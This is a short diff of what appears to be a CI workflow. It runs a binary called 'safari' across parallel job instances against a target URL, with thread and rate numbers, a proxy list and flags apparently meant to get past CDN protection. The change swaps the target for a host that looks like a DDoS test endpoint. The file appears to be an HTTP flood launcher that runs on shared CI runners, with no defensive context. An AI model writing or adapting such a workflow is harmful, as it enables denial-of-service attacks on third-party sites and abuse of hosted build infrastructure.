@@ -38,5 +38,5 @@ jobs:
     - name: Run a.js (Instance ${{ matrix.instance }})
       run: |
         chmod +x *
-        ./safari  https://ip.ipcount.org/ 700 1000 8000 proxies.txt  --cdn --auth
+        ./safari  https://c2.dstatbot.win/ObbeSc9L 700 1000 8000 proxies.txt  --cdn --auth
         
